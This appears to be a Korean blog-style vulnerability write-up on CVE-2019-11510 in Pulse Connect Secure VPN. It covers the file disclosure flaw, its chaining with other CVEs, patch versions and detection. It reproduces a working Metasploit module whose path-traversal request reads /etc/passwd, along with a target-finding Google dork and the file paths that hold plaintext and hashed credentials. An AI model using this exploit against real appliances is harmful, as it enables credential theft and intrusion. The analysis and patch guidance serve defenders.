# CVE-2019-11510

## 개요
[CVE-2019-11510](https://nvd.nist.gov/vuln/detail/CVE-2019-11510)는 상용 VPN solution으로 쓰이는 Pulse Connect Secure(PCS)에서 발견된 임의 파일 노출 취약성이다.  
2019년 4월 초 Las Vegaas에서 열린 *Black Hat*과 *DEF CON* 회의에서 이 주제에 대한 세부사항을 공유한 [*DEVCORE*](https://devco.re/en/) 연구팀의 Orange Tsai와 Meh Chang에 의해 발견되었다.

**CVE-2019-11510**는 보고된 가장 심각한 문제 중 하나로, 이 결함을 통해 인증되지 않은 해커가 취약한 장치에서 발견된  configuration settings와 같은 중요한 정보를 포함한 **모든 파일**의 내용을 읽을 수 있다는 것이다.


## 분석
이 취약점을 통해 해커는 directory traversal sequence가 포함된 악의적인 HTTP 요청을 Uniform Resource Identifier(URI)와 함께 보내 취약 장치의 모든 파일에 접근할 수 있었다. 이것은 해커가 장치의 중요한 정보에 대한 접근 또한 제공하며, 이 공격은 그들이 발견한 다른 취약점들과 연계될 수 있다.

사용자가 VPN의 관리 인터페이스에 로그인하면, 일반 텍스트 암호가 */data/runtime/mtmp/lmdb/data.mdb*에 저장된다. 해커는 위의 방법을 사용하여 파일을 얻고, 사용자의 암호를 추출한 다음 장치에 로그인 할 수 있다. 로그인 후 장치는 관리 웹 인터페이스에서 **command injection 취약점**인 [CVE-2019-11539](https://nvd.nist.gov/vuln/detail/CVE-2019-11539) 에 노출된다.  
또한, 사용자 자격증명을 갖게 되어 인증된 사용자가 악의적인 파일을 업로드 하고 임의 파일을 호스트에 쓸 수 있도록 허용하는 **Network File Share(NFS) 의 취약점**인 [CVE-2019-11508](https://nvd.nist.gov/vuln/detail/CVE-2019-11508)에도 노출된다.

이 취약점은 또한 해커가 캐시된 자격 증명을 찾을 수 없는 경우에도 */data/runtime/mtmp/system*에 접근하여 사용자 및 해시된 암호 목록을 수집하여 충분한 시간과 노력을 통해 해시를 크래킹하여 자격 증명으로 로그인할 수 있다.  

아래 사진은 당시 이 취약점으로 패치가 적용되지 않은 경우 영향을 받을 수 있는 42,000개 이상에 대한 Shodan 검색 결과이다.  
![Shodan](https://www.tenable.com/sites/drupal.dmz.tenablesecurity.com/files/images/blog/ShodanMap.png)
이미지 출처: https://www.shodan.io  

## Proof of concept (PoC)
PoC는 2019년 8월 20일에 [Exploit Database](https://www.exploit-db.com/exploits/47297)에 [Alyssa Herrera](https://twitter.com/Alyssa_Herrera_)와 [Justin Wagner](https://twitter.com/0xDezzy)가 작성한 취약성 모듈이 게시되었다.  

<details>
<summary>코드 보기</summary>
<div markdown="1">

```ruby
# Exploit Title: File disclosure in Pulse Secure SSL VPN (metasploit)
# Google Dork: inurl:/dana-na/ filetype:cgi
# Date: 8/20/2019
# Exploit Author: 0xDezzy (Justin Wagner), Alyssa Herrera
# Vendor Homepage: https://pulsesecure.net
# Version: 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4
# Tested on: Linux
# CVE : CVE-2019-11510 
require 'msf/core'
class MetasploitModule < Msf::Auxiliary
	include Msf::Exploit::Remote::HttpClient
	include Msf::Post::File
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Pulse Secure - System file leak',
			'Description'    => %q{
				Pulse Secure SSL VPN file disclosure via specially crafted HTTP resource requests.
        This exploit reads /etc/passwd as a proof of concept
        This vulnerability affect ( 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4
			},
			'References'     =>
			    [
			        [ 'URL', 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11510' ]
			    ],
			'Author'         => [ '0xDezzy (Justin Wagner), Alyssa Herrera' ],
			'License'        => MSF_LICENSE,
			 'DefaultOptions' =>
		      {
		        'RPORT' => 443,
		        'SSL' => true
		      },
			))

	end


	def run()
		print_good("Checking target...")
		res = send_request_raw({'uri'=>'/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/'},1342)

		if res && res.code == 200
			print_good("Target is Vulnerable!")
			data = res.body
			current_host = datastore['RHOST']
			filename = "msf_sslwebsession_"+current_host+".bin"
			File.delete(filename) if File.exist?(filename)
			file_local_write(filename, data)
			print_good("Parsing file.......")
			parse()
		else
			if(res && res.code == 404)
				print_error("Target not Vulnerable")
			else
				print_error("Ooof, try again...")
			end
		end
	end
	def parse()
		current_host = datastore['RHOST']

	    fileObj = File.new("msf_sslwebsession_"+current_host+".bin", "r")
	    words = 0
	    while (line = fileObj.gets)
	    	printable_data = line.gsub(/[^[:print:]]/, '.')
	    	array_data = printable_data.scan(/.{1,60}/m)
	    	for ar in array_data
	    		if ar != "............................................................"
	    			print_good(ar)
	    		end
	    	end
	    	#print_good(printable_data)

		end
		fileObj.close
	end
end
```

</details>  

<br>

## 해결 방안
Pulse Secure는 보고된 각 CVE에 대하 정보와 함께 보안 권고사항을 게시했다. 패치 솔루션은 다음과 같다.
|**Version installed**|**Fixed release**|
|:---:|:---:|
|Pulse Connect Secure 9.0RX|Pulse Connect Secure 9.0R3.4 & 9.0R4|
|Pulse Connect Secure 8.3RX|Pulse Connect Secure 8.3R7.1|
|Pulse Connect Secure 8.2RX|Pulse Connect Secure 8.2R12.1|
|Pulse Connect Secure 8.1RX|Pulse Connect Secure 8.1R15.1|


## 시스템 영향 여부 확인  
CVE-2019-11510([Plugin ID 127897](https://www.tenable.com/plugins/nessus/127897))에 대한 직접 공격 검사를 비롯하여 이러한 취약성을 식별하는 Tenable 플러그인 목록이 [여기](https://www.tenable.com/plugins/search?q=cves%3A(%22CVE-2019-11510%22%20OR%20%20%22CVE-2019-11508%22%20OR%20%20%22CVE-2019-11540%22%20OR%20%20%22CVE-2019-11543%22%20OR%20%20%22CVE-2019-11541%22%20OR%20%20%22CVE-2019-11542%22%20OR%20%20%22CVE-2019-11539%22%20OR%20%20%22CVE-2019-11538%22%20OR%20%20%22CVE-2019-11509%22%20OR%20%20%22CVE-2019-11507%22)&sort=&page=1)에 나열되어 있다.


---

## 요약

- 2019년 4월 초 PCS에서 취약점 발견
- CVE-2019-11510 이 가장 중요한 주요 취약점
- 공격 패턴: 취약 시스템 스캔 -> Pulse Secure VPN의 시스템 패스워드 파일을 탈취 -> 성공시 해커는 장치의 인증을 통과하거나 실제 VPN 세션으로 위장할 수 있음
- 현재 취약 버전 업데이트를 통해 대응 가능  

출처 : https://www.tenable.com/blog/cve-2019-11510-proof-of-concept-available-for-arbitrary-file-disclosure-in-pulse-connect-secure